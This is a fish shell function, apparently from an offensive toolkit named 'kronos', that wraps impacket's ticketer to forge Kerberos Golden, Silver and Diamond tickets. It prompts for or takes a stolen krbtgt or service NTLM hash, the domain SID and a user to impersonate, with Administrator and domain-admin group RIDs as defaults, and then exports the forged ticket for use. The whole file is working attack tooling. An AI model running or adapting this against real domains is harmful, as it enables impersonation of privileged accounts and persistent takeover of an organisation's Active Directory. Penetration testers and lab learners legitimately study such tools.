# description: Create Golden, Silver, and Diamond Tickets (Interactive & Flags)
function __kronos_ticket --description "Create Golden, Silver, and Diamond Tickets using ticketer.py"
    set -l subaction $argv[1]
    set -l wizard 0
    if contains -- "$subaction" golden silver diamond
        set wizard 1
        set -e argv[1]
    end

    argparse h/help u/user= d/domain= S/sid= H/hash= s/spn= I/user-id= G/groups= A/auth-user= P/auth-pass= -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos ticket [golden|silver|diamond] [OPTIONS]"
        echo ""
        echo "Create Golden, Silver, or Diamond tickets using impacket's ticketer.py."
        echo "If a subcommand is specified without all required flags,"
        echo "an interactive wizard will guide you through the process."
        echo ""
        echo "Options:"
        echo "  -u, --user USER      User to impersonate (default: Administrator)"
        echo "  -d, --domain DOMAIN  Target domain FQDN (falls back to \$TGT_DC_DOMAIN)"
        echo "  -S, --sid SID        Domain SID"
        echo "  -H, --hash HASH      krbtgt hash (Golden/Diamond) or service hash (Silver)"
        echo ""
        echo "Silver Ticket Options:"
        echo "  -s, --spn SPN        Target SPN (e.g., cifs/dc.domain.com)"
        echo ""
        echo "Diamond Ticket Options:"
        echo "  -A, --auth-user USER Low-priv user for authentication"
        echo "  -P, --auth-pass PASS Low-priv password for authentication"
        echo "  -I, --user-id RID    User RID (default: 500 for Administrator)"
        echo "  -G, --groups RIDS    Comma-separated group RIDs (default: 512,513,518,519,520)"
        echo ""
        echo "  -h, --help           Show this help message"
        return 0
    end

    # Capture flags first
    set -l domain $_flag_domain
    set -l user $_flag_user
    set -l sid $_flag_sid
    set -l hash $_flag_hash
    set -l spn $_flag_spn
    set -l user_id $_flag_user_id
    set -l groups $_flag_groups
    set -l auth_user $_flag_auth_user
    set -l auth_pass $_flag_auth_pass

    if test "$wizard" -eq 1
        set_color cyan; echo "[*] Starting $subaction ticket wizard..."; set_color normal
        
        # 1. Hash (krbtgt for golden/diamond, service for silver)
        set -l hash_label "krbtgt NTLM Hash"
        if test "$subaction" = "silver"; set hash_label "Service NTLM Hash"; end
        set -l def_hash "$TGT_CRED_PASSWORD"
        if test -n "$hash"; set def_hash "$hash"; end
        set hash (__kronos_ask "$hash_label" "$def_hash"); or return 1

        # 2. Domain SID
        set -l def_sid ""
        if test -n "$sid"; set def_sid "$sid"; end
        set sid (__kronos_ask "Domain SID" "$def_sid"); or return 1

        # 3. Domain FQDN
        set -l def_domain "$TGT_DC_DOMAIN"
        if test -n "$domain"; set def_domain "$domain"; end
        set domain (__kronos_ask "Domain FQDN" "$def_domain"); or return 1

        # 4. User to impersonate
        set -l def_user "Administrator"
        if test -n "$user"; set def_user "$user"; end
        set user (__kronos_ask "User to impersonate" "$def_user"); or return 1
        
        # 5. Subaction specific prompts
        if test "$subaction" = "silver"
            set -l def_spn ""
            if test -n "$spn"; set def_spn "$spn"; end
            set spn (__kronos_ask "Target SPN (e.g. cifs/dc01.dante.local)" "$def_spn"); or return 1
        else if test "$subaction" = "diamond"
            set -l def_auth_user "$TGT_CRED_USERNAME"
            if test -n "$auth_user"; set def_auth_user "$auth_user"; end
            set auth_user (__kronos_ask "Authentication User (Low-priv)" "$def_auth_user"); or return 1

            set -l def_auth_pass ""
            if test -n "$auth_pass"; set def_auth_pass "$auth_pass"; end
            set auth_pass (__kronos_ask "Authentication Password" "$def_auth_pass"); or return 1

            set -l def_user_id "500"
            if test -n "$user_id"; set def_user_id "$user_id"; end
            set user_id (__kronos_ask "Target User RID" "$def_user_id"); or return 1

            set -l def_groups "512,513,518,519,520"
            if test -n "$groups"; set def_groups "$groups"; end
            set groups (__kronos_ask "Group RIDs (comma-separated)" "$def_groups"); or return 1
        end
    else
        # Non-wizard fallbacks
        if test -z "$domain"; set domain "$TGT_DC_DOMAIN"; end
        if test -z "$user"; set user "Administrator"; end
        if test "$subaction" = "diamond"
            if test -z "$user_id"; set user_id "500"; end
            if test -z "$groups"; set groups "512,513,518,519,520"; end
        end
    end

    # Final Validation
    if test -z "$domain"; echo "error: domain is required (-d)"; return 1; end
    if test -z "$sid"; echo "error: domain SID is required (-S)"; return 1; end
    if test -z "$hash"; echo "error: hash is required (-H)"; return 1; end
    
    if test "$subaction" = "silver" -a -z "$spn"
        echo "error: SPN is required for silver tickets (-s)"
        return 1
    end
    
    if test "$subaction" = "diamond"
        if test -z "$auth_user"; echo "error: auth-user is required for diamond tickets (-A)"; return 1; end
        if test -z "$auth_pass"; echo "error: auth-pass is required for diamond tickets (-P)"; return 1; end
    end

    set -l impacket_cmd ""
    if command -v ticketer.py >/dev/null
        set impacket_cmd ticketer.py
    else if command -v impacket-ticketer >/dev/null
        set impacket_cmd impacket-ticketer
    else
        echo "error: ticketer not found. run 'kronos install'." >&2
        return 1
    end

    set -l ticket_args -nthash "$hash" -domain-sid "$sid" -domain "$domain"
    
    switch "$subaction"
        case silver
            set -a ticket_args -spn "$spn"
            echo "[*] Forging Silver Ticket for $user via $impacket_cmd..."
        case diamond
            set -a ticket_args -request -user "$auth_user" -password "$auth_pass" -user-id "$user_id" -groups "$groups"
            echo "[*] Forging Diamond Ticket for $user via $impacket_cmd..."
        case golden '*'
            echo "[*] Forging Golden Ticket for $user via $impacket_cmd..."
    end
    
    set -a ticket_args "$user"

    command $impacket_cmd $ticket_args
    
    if test -f "$user.ccache"
        set -gx KRB5CCNAME "$PWD/$user.ccache"
        echo "[+] Ticket saved and exported to KRB5CCNAME=$KRB5CCNAME"
    end
end
